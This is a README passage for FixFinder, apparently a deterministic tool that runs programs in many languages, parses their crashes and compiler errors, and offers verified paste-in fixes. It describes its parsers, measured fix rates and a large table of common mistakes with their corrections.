# FixFinder

[![tests](https://github.com/ethanraybrown0707-ui/FixFinder/actions/workflows/tests.yml/badge.svg)](https://github.com/ethanraybrown0707-ui/FixFinder/actions/workflows/tests.yml)
[![test count](https://img.shields.io/endpoint?url=https%3A%2F%2Fraw.githubusercontent.com%2Fethanraybrown0707-ui%2FFixFinder%2Fmain%2F.github%2Fbadges%2Ftests.json)](https://github.com/ethanraybrown0707-ui/FixFinder/actions/workflows/tests.yml)
[![Licence: MIT](https://img.shields.io/badge/licence-MIT-blue.svg)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ethanraybrown0707-ui/FixFinder?style=flat&label=stars)](https://github.com/ethanraybrown0707-ui/FixFinder/stargazers)
[![languages](https://img.shields.io/static/v1?label=languages&message=15%20%2B%20generic&color=blue)](#languages)

Run a program in any language, catch its crash - or its wrong answer - look for a published fix or work one
out, and hand it to you as code you can paste. FixFinder never writes to your files.

No local AI and no model calls. Everything here is deterministic: regex stack-trace parsers,
rule-based normalisation, API search, a scored ranking formula you can read, and a unified-diff
engine that turns a patch into the code it should end up as, with exact context or not at all.

## Using it

1. **Pick a program** - the button, a drag onto the window, or a file dropped on the exe.
   Nothing has to be named or configured: `crash.py` becomes `python crash.py`, a `.jar` becomes
   `java -jar`, a `.c` is compiled with whichever of MSVC, gcc or clang is installed, a loose
   `.cs` is built and run by the .NET SDK. The window says what it worked out before anything
   runs.

   | Runs as it is | Compiled first |
   |---|---|
   | `.py` `.js` `.ts` `.rb` `.pl` `.php` `.lua` `.sh` `.ps1` `.go` | `.c` `.cpp` `.cc` `.cxx` `.java` |
   | `.exe` `.bat` `.cmd` `.dll` `.jar` | `.cs` `.csproj` `.sln` *(via the .NET SDK)* |

   Toolchains are found on PATH **and** in the usual install locations — Visual Studio is found
   through `vcvarsall.bat`, a JDK through `Program Files`. Settings lists what is present, and a
   missing one is named along with the command that installs it.

   **A program in more than one file is run as the whole program.** Only what the files themselves
   settle is followed:

   | Picked | Run as |
   |---|---|
   | `main.c` beside `util.c` | both compiled together - when exactly one file in the folder has a `main` |
   | `src/app/Main.java` declaring `package app;` | compiled from `src`, so `app.util.Helper` is found |
   | `main.go` beside `helper.go`, both `package main` | `go run` on every file of the package, or `go run .` with a `go.mod` |
   | `Program.cs` under a `.csproj` | `dotnet run --project`, so the rest of the project is built with it |
   | `shop/app.py` with `from .helper import greet` | `python -m shop.app`, from the folder above the package |

   Two C files in one folder that both have a `main` are two programs, and each still runs on its own.

   **Arguments** go in the box under the program, typed as they would follow its name in a terminal. They
   are handed to the program itself, never to what runs it - after `dotnet run`'s `--`, after the script
   for Python - and every rerun uses them too, including the AddressSanitizer one.

   **What it should print** goes in the box beside the input, and is optional. With it, a program that runs to
   the end is checked for **logic errors** too - output that is simply wrong - and the change that makes it right
   is searched for and checked by running it: see [Logic errors](#logic-errors-programs-that-run-and-are-wrong).
   **+ Add another run** adds more runs, each with its own input and expected output; the more there are, the more
   exactly the mistake is pinned down.
2. **Press "Run it and find a fix"**, and confirm the command line it shows you.
   C, C++ and Java are compiled first — and if the build fails, the **compiler error** is what
   gets looked up, which is often a better search term than a runtime message: `C2065` and
   `CS0103` are globally unique and everybody who hits one pastes it verbatim into a search box.
3. **If it crashed and something was found, you get shown it** - what went wrong, what was
   found, and one button that copies the fix. **Skip problem** moves on to the next error, so a
   program with several can be worked through in one sitting.

Nothing else is asked for. Where the source lives, what to search for, which of forty results
to open, whether that result's patch fits your copy of the code - all of it is worked out, and
the parts that could not be are said out loud rather than turned into questions up front.

The prompt only appears when there is a real decision to make. A program that ran fine, or one
that crashed with nothing published about it, is reported in the window and never interrupts.

## Languages

Fifteen languages have a dedicated stack-trace parser; anything else falls back to a generic one
that harvests a file and line number, capped at low confidence so it can never outrank a real
parse.

| Language | Runtime errors | Compiler errors | Exercised end to end |
|---|---|---|---|
| Python | traceback, chained causes, 3.11+ carets | — | yes |
| C# / .NET | inner exceptions, async resume frames | `CS####` | yes |
| C | access violations, overruns, divide by zero - located with AddressSanitizer | `C####` via MSVC, or gcc/clang with their fix-its | yes |
| C++ | uncaught exceptions, access violations, overruns - located with AddressSanitizer | `C####` via MSVC, or g++/clang with their fix-its | yes |
| Java | `Caused by` chains, `... N more` | javac `cannot find symbol` and friends | yes |
| JavaScript / Node | stack frames, `node:` internals, syntax errors placed by the line Node prints above them | `SyntaxError`, checked with `node --check` | yes |
| Go | two-line panic frames, goroutine blocks, deadlocks | every `go build` error in the build | yes |
| Rust | modern and legacy panic formats | — | parser only |
| Ruby | Ruby 3.4 quoting and the older form | — | yes |
| PHP | uncaught throwables, `#N` traces, `{main}` | parse errors | yes |
| PowerShell | error records, 5.1 and 7 layouts | — | yes |
| Dart / Flutter | `Unhandled exception`, SDK and package frames | — | yes |
| Elixir / Erlang | `** (Type)`, app frames, Erlang built-ins | — | yes |
| Perl | `die` and Carp `called at` chains | — | yes |
| Lua | error line plus `stack traceback:`, `[C]` frames | — | yes |

**"Yes"** means a deliberately-crashing program in that language was written to disk, launched
through FixFinder, and its error read back - the whole loop, not a fixture. Those runs are in the
suite and skip themselves when the runtime is absent, so a clean machine still goes green.

**Rust** is the one row still marked parser only. `rustc` and `cargo` are installed here, but a
`.rs` file has no launch path yet: Rust is compiled, so it needs a build step in the same shape as
C and Java rather than an interpreter entry. The parser is tested against captured output as
before.

Two details in that list are worth pulling out, because both are places a parser can be wrong
without looking wrong:

- **PHP writes the location two different ways.** An uncaught exception ends `in /app/x.php:12`;
  a parse error ends `in /app/x.php on line 12`. A parser that knows only the first reads the
  second file's path as `/app/x.php on line 12`, resolves it to nothing, and reports the crash
  with no location at all.
- **PowerShell's `FullyQualifiedErrorId` is the best search term it has.** The message is full of
  your own paths and searches badly; `PathNotFound` is stable across every machine that ever hit
  it. It is carried as an error code for the same reason MSVC's `C2065` is.

The parsers are also held apart by a test rather than by hope: for each language's captured
output, every *other* specific parser must score strictly lower on detection. A tie counts as a
failure, because the registry only tries the top three - a parser that draws with the right one
is a parser that can displace it on a slightly different transcript. That test found nothing at
nine parsers and is doing real work at fifteen, where PHP and Dart both number frames `#0` and
Lua and gcc share `file:line: message`.

### What running them actually changed

Every parser above was written from a knowledge of its format and tested against hand-written
fixtures, and all of those tests passed. Then the runtimes were installed and the same programs
were run for real. **Three of the six new parsers broke immediately**, in ways re-reading the code
would never have shown:

| | What real output did | Effect |
|---|---|---|
| PowerShell | wrapped the `At …` line at console width, **even when redirected** | no location at all, and the orphaned tail — `25\scratchpad\crash.ps1:2 char:1` — reported as the error message |
| Dart | opened with `#0 List.[] (dart:core-patch/growable_array.dart)`, **no line number** | first frame failed to match, loop stopped, all four frames lost including the only one on disk |
| Lua | named itself `C:\…\bin\lua.EXE:` — full path, **upper-case extension** | scored 100, parsed nothing, fell through to the generic parser |

None of those failed loudly. Each one still produced an error with a plausible type and message
and nowhere to go, which is the failure mode worth the most care — a tool that says *"no location"*
gets checked, and a tool that says `25\scratchpad\crash.ps1:2 char:1` gets believed.

The captured transcripts are kept as `live-*.txt` fixtures next to the hand-written ones, so the
real shapes cannot regress.

There is a trap in the live tests themselves, recorded here because it very nearly worked. Each
case skips when its runtime is missing, and a skip looks exactly like a pass. A process inherits
`PATH` when it starts, so a test host launched before a runtime was installed cannot see it — the
first full run reported **eight passing end-to-end tests that had not run anything at all**. The
tell is the duration: single-digit milliseconds means nothing happened.

Anything FixFinder cannot identify still gets a generic read, and it says so rather than
pretending otherwise.

## The fix that does not come from the web

Searching can only ever answer a problem somebody else also had. A typo in your own file is not
that, and for a long time it was the commonest thing FixFinder could do nothing whatsoever about.

The runtime already knows the answer. Python 3.12 and later, gcc and clang all compare the unknown
name against what is really in scope and print the result:

```
AttributeError: 'Supply' object has no attribute 'heavey'. Did you mean: 'heavy'?
NameError: name 'avarage' is not defined. Did you mean: 'average'?
```

That is not a guess this tool is making. The interpreter had the whole symbol table in front of
it, established the answer, printed it, and every tool that reads the traceback throws it away.
FixFinder now turns it into a one-line unified diff and runs it down exactly the same road as a
patch downloaded from a stranger's repository: extracted, parsed, path-mapped, matched with exact
context, and handed over as the corrected line. A locally produced fix that skipped any of that
would be the one answer in the tool nobody had checked.

It ranks above the search results rather than among them, because it is not one of them: every
weight in the ranker estimates how likely a stranger's post is to be about this crash, and this
came out of this crash, naming this file and this line.

**It refuses to guess.** The replacement happens only when the wrong name appears exactly once on
the line the error names. Twice, and there is no way to know which was meant, so nothing is
offered - the same rule the path mapper applies to two files of the same name.

**It needs no network at all.** Nothing is looked up, so it works with Offline ticked.

Which runtimes actually volunteer a correction, checked rather than assumed:

| Runtime | Suggests? | Status here |
|---|---|---|
| Python 3.12+ | yes - `Did you mean: 'average'?` | **proven end to end**, driven live and copied |
| gcc | yes - `'avarage' undeclared ... did you mean 'average'?` | **proven end to end** with MinGW gcc 13, and its parseable fix-its are applied too |
| clang | yes - `use of undeclared identifier 'avarage'; did you mean ...` | pattern tested against captured output |
| Ruby | yes - `Did you mean?  average`, on its own line | pattern tested against captured output |
| javac | **no** - `cannot find symbol`, nothing more | measured on this machine; FixFinder works the name out itself, below |
| C# / Roslyn | **no** - `'totl' does not exist in the current context` | measured on this machine |
| MSVC | **no** - `error C2065: 'avarage': undeclared identifier` | measured on this machine; FixFinder works the name out itself, below |
| Node, Go, Rust | not read yet | rustc carries machine-applicable suggestions in a different form |

The three that say no are not a gap in FixFinder: those compilers genuinely do not compute a
suggestion, so there is nothing to read - which is why, for javac and MSVC, FixFinder now works the
nearest name out from the file instead. Checking was worth it - gcc and clang put the name on
*opposite sides* of the word `undeclared`, and Ruby writes a question mark where Python writes a
colon and puts the answer on the next line, so a pattern that looked like it covered all of them
covered one.

## Fixes worked out from your code

The runtime's own suggestion covers a handful of mistakes. Most of the commonest errors in Python,
Java, C and C# are a different kind: the message pins the answer down without spelling it out. A missing
import, a missing semicolon, a loop that runs one step too far, a public class in the wrong file.
Nobody else has written about *your* missing semicolon, so searching does worst on exactly these.

That was measured rather than assumed. Forty-six small programs, each broken the way real programs
break - nineteen Python, fifteen Java, twelve C - were run through FixFinder before and after:

| | Python | Java | C | All 46 |
|---|---|---|---|---|
| Search, plus the runtime's own suggestions | 4 | 1 | 0 | **5** |
| Now, with C built by MSVC | 11 | 10 | 8 | **29** |
| Now, with C built by gcc | 11 | 10 | 7 | **28** |

With search alone, 37 of the 46 came back as advice, and too much of it was beside the point: a
missing semicolon in Java turned up questions about Xcode, and the top three for a missing
`import java.util.List` included a list of working motherboards. Where search was relevant - Stack
Overflow's canonical question about non-static methods, say - it was still prose to read, not the
line to change.

**Then, one language at a time, the constructs people actually get wrong.** A second set of small
programs was written from the mistakes of someone learning each language, and of someone arriving
from another one - `elif` in Java, `print` in C#, `string` in C, `.length` in Python, `System.out.println` in C++, `print` in JavaScript, `while` in Go - and rules were
added until what was left had no single right edit:

| | Programs | Before | Now |
|---|---|---|---|
| Python: constructs | 70 | 4 | 45 |
| Python: fifty beginner concepts | 50 | 8 | 28 |
| C# | 47 | 0 | 39 |
| C, built by gcc | 44 | 17 | 34 |
| C, built by MSVC | 44 | 13 | 34 |
| Java | 50 | 15 | 45 |
| C++, built by g++ | 50 | 17 | 44 |
| C++, built by MSVC | 50 | 14 | 43 |
| JavaScript | 45 | 0 | 39 |
| Go | 40 | 0 | 36 |

**And then the mistakes of later years** - inheritance and interfaces, generics, collections and LINQ,
closures, async, exceptions, pointers, macros and two-dimensional arrays, and in C++ virtual functions,
templates, smart pointers, lambdas, `const` and threads; in JavaScript classes and `this`, promises and modules;
in Go interfaces, channels and multiple return values. A third set, the same method:

| | Programs | Before | Now | What is left |
|---|---|---|---|---|
| Python | 33 | 2 | 28 | recursion with no base case, an abstract class created, a missing file, a closed file, a missing key |
| Java | 23 | 1 | 19 | an abstract method never written, a lambda changing a local, `new Runnable()`, a null from a map |
| C# | 21 | 0 | 18 | an abstract class created, an interface member never written, `>` on a generic `T` |
| C, built by gcc | 14 | 1 | 7 | five never failed at all under gcc; `switch` on a string; `strcpy` into an uninitialised pointer |
| C, built by MSVC | 14 | 1 | 8 | four never failed at all under MSVC; the same two |
| C++, built by g++ | 30 | 0 | 21 | an abstract class created, no `operator<<` for a struct, `>` on a template's type, a `map::at` or `throw` nobody caught; `delete` for `delete[]`, erasing inside a range-`for` and an `auto` parameter never failed |
| C++, built by MSVC | 30 | 0 | 20 | the same four, and an uncaught exception or a thread never joined, which MSVC ends without a word; `delete` for `delete[]`, a missing `typename` and a returned reference to a local never failed |
| JavaScript | 25 | 0 | 20 | recursion with no base case, an error thrown on purpose, `new` on an arrow function, a class used before it is declared, a private field used outside its class |
| Go | 20 | 0 | 14 | a failed type assertion, a `WaitGroup` passed by value, `>` on a generic type, a channel closed twice, a constant that overflows, a method on `string` |

These counts were measured before unwritten members, mistakes that never fail and MSVC's silent C++ endings
were taken on, and have not been measured again; [what is still not fixed](#what-is-still-not-fixed-and-why)
says which of what is left now has a fix.

**And then coursework from all four years of a degree** - the modules after the first term: data structures and
algorithms (a breadth-first search on a `deque`, sets, heaps, linked lists, hashing, comparators and `Comparable`), systems
programming in C (a linked list freed while it is walked, `malloc` measuring the wrong type, a header included twice, a
`qsort` comparator), operating systems and concurrency (threads in all seven languages, Java monitors, Python processes,
Go `WaitGroup`s and channels), networks (sockets, bytes and text), databases (`sqlite3` parameters), serialisation and
JSON, generics, records and interfaces, `async` code and pattern matching. A fourth set, the same method, with C and C++
built both ways:

| | Programs | Before | Now | What is left |
|---|---|---|---|---|
| Python | 28 | 3 | 25 | a heap of objects that cannot be compared, a linked list that is empty, `lru_cache` on a function given a list |
| Java | 17 | 3 | 16 | the next node of a linked list that is `null` |
| C# | 8 | 0 | 7 | `lock` on an `int`, which needs a new object to lock |
| C, built by gcc | 11 | 0 | 10 | a `size_t` printed with `%d`, which never fails on this machine |
| C, built by MSVC | 11 | 1 | 7 | the one "before" was wrong (see below); `pthread.h`, which MSVC does not have; and `scanf("%s", &name)`, a `qsort` comparator and `%d` for a `size_t`, which MSVC neither warns about nor fails on |
| C++, built by g++ | 9 | 0 | 6 | a class holding raw memory copied (the rule of three), `count` clashing with `std::count`, a template defined in a `.cpp` |
| C++, built by MSVC | 9 | 0 | 6 | the same three |
| JavaScript | 8 | 1 | 6 | `JSON.parse` given an object, `require` and top-level `await` in one file - each with two right answers |
| Go | 3 | 0 | 3 | |

Two things it turned up were already wrong, not just missing. With MSVC, `#include <pthread.h>` - a POSIX header MSVC does
not have - was "fixed" to `<threads.h>`, the nearest standard name and a different threads API; platform headers are no
longer treated as typos. And `data` from a socket joined to text was wrapped in `str()`, which prints `b'hello'`, quotes and
all; bytes are now decoded instead.

Each of those is a live test now, run through FixFinder for real - `CourseworkTests` - and each of the new rules is listed
with the rest in the table below.

**How a fix is worked out.** Each rule reads one kind of error, and the lines it names, and proposes
exactly one change:

| | The error | The fix handed over |
|---|---|---|
| Python | `Did you forget to import 'math'?` | `import math`, after the docstring and the existing imports |
| | `expected ':'`, `Missing parentheses in call to 'print'`, `Maybe you meant '=='` | the colon, the call, the comparison |
| | `expected an indented block after ... on line 1` | the named line, indented the way the file indents |
| | `can only concatenate str (not "int") to str` | `str(total)`, placed by Python's own underline |
| | `cannot access local variable 'count'` | `global count` - only when the module has a `count` and the function never sets its own |
| | `else if`, `elseif`, `&&`, `!ready`, `count++`, `let`, `new Dog()`, `catch`, `null`, `this.name` | `elif`, `and`, `not ready`, `count += 1`, the bare name, `Dog()`, `except`, `None`, `self.name` |
| | `text.length`, `items.push(3)`, `text.toUpperCase()`, `name.equals("x")`, `d.has_key("a")` | `len(text)`, `items.append(3)`, `text.upper()`, `name == "x"`, `"a" in d` |
| | `for i in 10`, `items[len(items) / 2]`, `age > 18` with `age = "20"`, `", ".join(numbers)`, `for n in numbers.sort()` | `range(10)`, `//`, `int(age) > 18`, `map(str, numbers)`, `sorted(numbers)` |
| | `def bark():` in a class, `def greet:`, `import Math`, `raw_input`, `except ValueError, e`, `raise "oops"` | `self`, the brackets, `import math`, `input`, `as e`, `raise Exception("oops")` |
| | an unclosed string or f-string brace, one `)` too many, a stray indent, tabs mixed with spaces | the quote, the brace, the bracket removed, the indentation |
| | `c.area()` on a `@property`, `name = name` in `__init__`, `super().__init__()` without its arguments | `c.area`, `self.name = name`, `super().__init__(name)` |
| | `except ValueError e:`, `[n for n in xs if n > 0 else 0]`, `await` outside `async def`, `asyncio.run(main)` | `as e`, `[n if n > 0 else 0 for n in xs]`, `async def`, `asyncio.run(main())` |
| | `names[name]` inside `for name in names`, `for k, v in ages`, `for i, x in items`, `{price:.2f}` on text | `name`, `ages.items()`, `enumerate(items)`, `{float(price):.2f}` |
| | `map(...)[0]`, a generator or `keys()` indexed, a tuple or a string item assigned, a list added to a set | `list(...)`, a list comprehension, a list or a rebuilt string, a tuple |
| | an inner function changing its parent's variable, a function that never returns its result, `dataclass` or `defaultdict` unimported, `pprint(data)` | `nonlocal`, `return total`, the `from ... import`, `pprint.pprint` |
| Java | `cannot find symbol: class List` | every missing import in the build at once, from a table of JDK classes |
| | `cannot find symbol: variable avarage` | the one name within a letter or two - from the file, or for `System.out.printn` from the real JDK class, read with `javap` |
| | `';' expected` | the semicolon, where javac's caret points |
| | `unreported exception InterruptedException` | `throws` on the enclosing method, fully qualified if it is not imported |
| | `non-static method total() cannot be referenced from a static context` | `static` on the method |
| | `class Main is public, should be declared in a file named Main.java` | the class renamed to match the file |
| | `Index 3 out of bounds for length 3` | `<` instead of `<=` in the loop driving that index |
| | `String cannot be converted to int` | `Integer.parseInt(...)` |
| | `bool`, `True`, `None`, `print(...)`, `Console.WriteLine`, `elif`, `foreach`, `for (String n in names)` | `boolean`, `true`, `null`, `System.out.println`, `else if`, `for`, `for (String n : names)` |
| | `values.length()` on an array, `name.length` on a String, `names.length` on a List, `names[0]`, `name[0]` | `values.length`, `name.length()`, `names.size()`, `names.get(0)`, `name.charAt(0)` - javac names the variable's type |
| | `int cannot be dereferenced`, `int cannot be converted to boolean`, `unexpected type` for `ArrayList<int>` | `x == 5`, `if (x == 5)`, `ArrayList<Integer>` |
| | `possible lossy conversion`, `Object cannot be converted to String`, `bad operand types` | `(int) 5.5`, `(String) value`, `Integer.parseInt(a) - 1`, `'a'` for a char compared with `"a"` |
| | `'hello'`, `ArrayList<>()` without `new`, `reached end of file while parsing`, `variable total might not have been initialized`, `package system does not exist` | `"hello"`, `new`, the closing brace, `= 0`, `System` |
| | an interface method implemented without `public`, `@Override` on a misspelt name, `implements` a class, `extends` an interface | `public`, the inherited name - `toString`, `speak` - `extends`, `implements` |
| | `super(...)` after other statements, `void` on a constructor, `private` on a top-level class, `new T[10]` | `super(...)` first, no `void`, no `private`, `(T[]) new Object[10]` |
| | `integer number too large`, a variable declared twice, `values.stream()` on an array, `Arrays` unimported | `L`, an assignment, `Arrays.stream(values)`, the import |
| | `if (x); { ... } else`, catch clauses in the wrong order, an unclosed string | the semicolon removed, the specific catch first, the quote |
| | `ConcurrentModificationException` from `remove` inside a for-each, `split(".")` | `removeIf(...)`, `split("\\.")` |
| | `Dog is not abstract and does not override abstract method speak()` - from a class or an interface, in the file or beside it | the method, with `@Override` and its signature copied, throwing `UnsupportedOperationException` until it is written |
| C | `'bool': undeclared identifier`, `'malloc' undefined` | the standard header |
| | a misspelt variable, member or function | the nearest name, since MSVC never suggests one |
| | `Cannot open include file: 'stdoi.h'` | `<stdio.h>` |
| | `missing ';' before 'printf'` | the semicolon, at the end of the statement before |
| | `'{': no matching token found`, `expected declaration or statement at end of input` | the closing brace |
| | anything gcc or clang printed a fix-it for | the compiler's own edit - see below |
| | `elif`, `and` and `or`, `if x > 1 {`, `string name = "Ethan"`, `cout <<`, `#include <iostream>` | `else if`, `&&` and `\|\|`, the brackets, `char name[]`, `printf`, `<stdio.h>` |
| | an unclosed string or bracket, one `}` too many, a struct with no `;` after it | the quote, the bracket, the brace removed, the semicolon |
| | `parcel p` for a struct, `->` on a struct, `.` on a pointer, a typedef'd struct's misspelt member | `struct parcel p`, `.`, `->`, the real member |
| | `for (i = 0; ...)` with `i` undeclared, `int x = 2;` twice, `name = "Ethan"` for a char array | `int i` in the loop when nothing else uses it, `x = 2;`, `strcpy` - only when the text fits |
| | a function called before it is defined | its declaration, above the first call |
| | AddressSanitizer's `attempting double-free`, and `stack-buffer-overflow` from a loop | the second `free` removed; the loop stopped at the array's size |
| | `printf("%s", 5)`, which compiles with a warning and crashes | `%d` - from MSVC's `C4477`, or gcc's own fix-it under `-Wformat` |
| | `#define SIZE 5;`, `Main` instead of `main`, `if (x); { ... } else`, `int grid[][]` as a parameter | the semicolon removed, `main`, the semicolon removed, the column count of the arrays it is called with |
| | `*p` on a `void *`, `free` of a stack array, `scanf("%d", age)`, a `char` printed with `%s` | `*(int *)p`, the `free` removed, `&age`, `%c` - where gcc's own fix-it would say `%d` |
| | mistakes that ran to the end anyway: `gets(name)`, `char code[5] = "ABCDEFG"`, a local array returned, `malloc(5)` for five `int`s | `fgets` with the newline trimmed, `char code[]`, `static` on the array, `malloc(5 * sizeof *values)` - see below |
| C# | `; expected`, `} expected`, `Syntax error, '(' expected`, `Too many characters in character literal` | the semicolon where Roslyn's column points, the brace, the brackets round `if x > 5`, double quotes |
| | `The name 'print'`, `'True'`, `'None'`, `'len'` or a `for` loop's `'i'` `does not exist` | `Console.WriteLine`, `true`, `null`, `name.Length`, `int i` - or the one name in the file within a letter or two |
| | `'Console' does not contain a definition for 'WriteLin'`, `'List<int>' ... 'Length'`, `'string' ... 'equals'` | the real member, read from .NET itself by reflection: `WriteLine`, `Count`, `Equals` |
| | `Non-invocable member 'string.Length'`, `'List<T>' cannot be used like a method` | `Length` without brackets, `new List<int>()` |
| | `Cannot implicitly convert type 'string' to 'int'`, and the other conversions | `18` for `"18"`, `int.Parse(input) + 1` - never `int.Parse(input + 1)` - `'a'` for `"a"`, `==` for `if (x = 5)`, `(int)` for a double |
| | `elif`, `System.out.println`, `foreach (item in items)`, `Lsit<int>`, `boolean`, `System.Collection` | `else if`, `Console.WriteLine`, `var item`, `List<int>`, `bool`, `System.Collections` |
| | an instance method called from `static Main`, a private member, `await` outside `async`, a missing `using`, a method with no return type, `int total;` read before it is set | `static`, `public`, `async Task`, the `using`, the type its `return`s give, `= 0` |
| | `IndexOutOfRangeException` from `i <= items.Length` | `<` |
| | an interface member that is not public, `override` of a method not marked `virtual`, a misspelt override, `void` on a constructor | `public`, `virtual` on the base method, the inherited name, no `void` |
| | a get-only property assigned, a static member reached through an object, a public method taking an internal class | `{ get; set; }`, the class name, `public` on the class |
| | `word[0] == "a"`, `"10" - 1`, a string passed where an int is wanted, `Where(...)` assigned to a `List`, a `List` to an array | `'a'`, `int.Parse`, `int.Parse(...)`, `.ToList()`, `.ToArray()` |
| | `x.ToString` without brackets, a variable declared twice, catch clauses out of order, `if (x); { ... } else`, a `case` with no `break` | `()`, an assignment, the specific catch first, the semicolon removed, `break;` |
| | `Collection was modified` from `Remove` inside a `foreach` | `RemoveAll(...)` |
| | `'Dog' does not implement interface member 'IAnimal.Speak()'`, `does not implement inherited abstract member` | every missing member at once, signatures copied: methods throwing `NotImplementedException`, settable properties as `{ get; set; }`, `override` for an abstract one |
| C++ | `'cout' was not declared`, `'string': undeclared identifier`, `std::endll` | `std::cout` and `std::endl` for the whole line, `std::string`, `std::endl` |
| | `System.out.println`, `Console.WriteLine`, `print(...)`, `null`, `True`, `boolean`, `String` | `std::cout << ... << std::endl`, `nullptr`, `true`, `bool`, `std::string` |
| | `std::cout >> total`, `std::cin << age`, `values.add(1)`, `values.length()`, `ages.containsKey(k)`, `name.size` | `<<`, `>>`, `push_back`, `size()`, `count`, `size()` |
| | `Dog d = new Dog();`, `d->age` on an object, `d.age` on a pointer, `this.name`, a private member used from `main` | `Dog d;`, `.`, `->`, `this->name`, `public:` |
| | `void main`, `char name = "Ada"`, `'Ada'`, `std::vector<int> values();`, `"Hello, " + "world"`, `text + age`, a function with no return type | `int main`, `std::string`, `"Ada"`, no brackets, `std::string("Hello, ")`, `std::to_string(age)`, the type its `return`s give |
| | a block closed too soon, a `class` without its `;`, a function called above its definition, a variable declared twice, `using namespace std` without `;` | the early `}` removed, the `;`, a declaration, an assignment, the `;` |
| | `override` of a function that is not `virtual`, a misspelt override, `class Dog : Animal`, `void speak() const` defined without `Dog::` | `virtual` on the base, the inherited name, `public Animal`, `Dog::speak` |
| | a `unique_ptr` copied, a `const` object calling a method not marked `const`, `typename` missing, a lambda without its capture or changing its copy | `std::move` - only when nothing uses it afterwards - `const`, `typename`, `[&total]` |
| | `Meters m = 5.0` with an `explicit` constructor, a `static` member never defined, a `const` member assigned in the constructor, a default argument given twice, an `auto` parameter under C++17 | `Meters m(5.0)`, its definition after the class, `: radius(r)`, the second default removed, a template |
| | `word[0] == "a"`, `std::sort` on a `std::list` | `'a'`, `values.sort()` |
| | `terminate called after throwing an instance of 'std::out_of_range'` from `.at(i)`, `terminate called without an active exception` - from g++, and from MSVC through the handler below | `<` in the one loop that reads `.at(i)` up to `.size()`, `worker.join()` |
| | `cannot declare variable 'd' to be of abstract type 'Dog'`, MSVC's `C2259` | each pure virtual the class never overrode, written as an `override` that throws `std::logic_error` until it is filled in - never for the base class itself |
| | `delete` of something made with `new[]`, which g++ warns about under `-Wmismatched-new-delete` | `delete[]` |
| | AddressSanitizer's double `delete`, `[0]` on an empty vector, `erase` inside a range-`for`, and a reference to a local returned | the second `delete` removed, `push_back`, `erase(std::remove_if(...))`, return by value |
| JavaScript | `missing ) after argument list`, an unclosed string, a brace missing or one too many, `'It's here'` | the bracket, the quote, the brace where the indentation says the block ended, double quotes |
| | `print`, `System.out.println`, `True`, `None`, `len(items)`, `elif`, `if x > 3 {`, `for item in items`, `(x) -> x * 2`, `def`, `fucntion` | `console.log`, `true`, `null`, `items.length`, `else if`, the brackets, `for (const item of items)`, `=>`, `function` |
| | `totl is not defined`, `count is not defined` inside a class, `items.append`, `text.length()`, `seen.push` on a Set, `ages.get` on an object, `Math.squareRoot`, `name.toUppercase` | the nearest name, `this.count`, `push`, `length`, `add`, `ages["Ada"]`, `Math.sqrt`, `toUpperCase` - read from Node itself |
| | `Assignment to constant variable.`, a `let` declared twice, properties without a comma between them, a class called without `new`, `await` outside `async` | `let`, an assignment, the comma, `new`, `async` on the function around it |
| | `require` in an ES module, `require("fss")`, a misspelt named import | `import`, `"fs"` - never `npm install fss` - the export's real name, everywhere it is used |
| | a getter called, a static method on an object, `module.export`, a promise used without `await`, `items(0)` | no brackets, the class name, `module.exports`, `await`, `items[0]` |
| | `super` missing, `name = name` in a constructor, `this` in a `function` callback, a method taken off its object, a setter that assigns itself | `super(name)`, `this.name = name`, an arrow function, `.bind(c)`, `this._name` |
| | `reduce` on an empty list, the result of `forEach` used, `ages["Ada"] = 36` on a Map | `, 0`, `map`, `ages.set("Ada", 36)` |
| Go | `undefined: fmt`, `"os" imported and not used`, `import fmt` | the import where gofmt puts it; the import removed only when nothing else in the build is wrong; the quotes |
| | `declared and not used: total` beside `undefined: totl`, `"fmt" imported and not used` beside `console.log` | the misspelling corrected, the call rewritten - never the variable or the import deleted |
| | `undefined: fmt.println (but have Println)`, `strings.Contians`, `d.name ... but does have field Name`, `items.length`, `items.append(4)` | `Println`, `Contains` read from `go doc`, `Name`, `len(items)`, `items = append(items, 4)` |
| | `count = 5` never declared, `:=` with nothing new, `null`, `True`, `while`, `for (i := 0; ...)`, `'hello'`, `if x = 5` | `:=`, `=`, `nil`, `true`, `for`, no brackets, double quotes, `==` |
| | `{` or `else` on the next line, an unclosed string, bracket or brace, `Func main` | joined onto the line above, the quote, the bracket, the brace, `func` |
| | `"Age: " + age`, `name[0] == "A"`, `var average float64 = count`, a function returning a value it never declared, `return errors.New(...)` short of a value | `fmt.Sprint(age)`, `'A'`, `float64(count)`, the return type, `return 0, errors.New(...)` |
| | `strconv.Atoi` taken as one value, `append` not stored, a pointer receiver, an interface method in the wrong case | `n, _ :=`, `items = append(...)`, `&Square{...}`, the interface's name |
| | `index out of range [3] with length 3`, a nil map, a deadlock on a channel nothing else touches, `Main`, `package app` | `<`, `make(...)`, a buffer or a `close`, `main`, `package main` |

**Every one is checked before you see it.** A copy of the file with the change made is compiled
outside your project - Python with `py_compile`, which parses the file and runs none of it; Java with
javac; C and C++ with the same compiler the build used; C# with `dotnet build`; JavaScript with `node --check`,
which parses it and runs none of it; Go with `go build` - and the change is offered only if the error it was
for has gone and nothing new has broken. A file that is part of a larger program is checked as part of it: a
C file with the rest of its folder, a Java file from its package root, a Go file with its package or a copy of
its module, a C# file in a copy of its project with the change in place - so a fix to `util.c` is found when
`main.c` was the one picked, and a change that compiles alone but breaks the program is not offered. Two equally near names is a refusal, not a pick: `printn` is
one letter from `print`, `println` and `printf`, so nothing is offered. For a crash, the check can
only prove the file still compiles, and the answer says exactly that rather than claiming the crash
is gone.

**Checks run side by side, and the answer does not change because of it.** The compiler is almost all
of the wait, so up to four proposed changes (half the processors, at most) are compiled at once, and
the whole local search runs alongside the web search instead of after it. Verdicts are still read in
rule order: a quick check of a later rule's change waits for every earlier one to be refused, so the
fix offered is the one the rules would pick one at a time. Checks still running when a fix is accepted
are stopped, and the log says so.

Three more things take waiting out without changing an answer. **MSVC's environment is set up once.**
Calling `vcvarsall.bat` took about 1.4 of the 1.5 seconds each MSVC check spent; its variables are now
captured the first time and cl.exe is run directly in them, and a test compiles the same broken file
both ways and requires the same errors. If the environment cannot be read back cleanly, checks call the
script as before. **A check is never compiled twice.** Two rules that arrive at the same edit share one
compile, and a result is remembered for as long as FixFinder is open - keyed on the compiler, its
arguments, the exact bytes, and for Java, C and C++ every file in the folder beside it, so an edited
header is a new check. Only what the compiler said about the file itself is remembered; a link error,
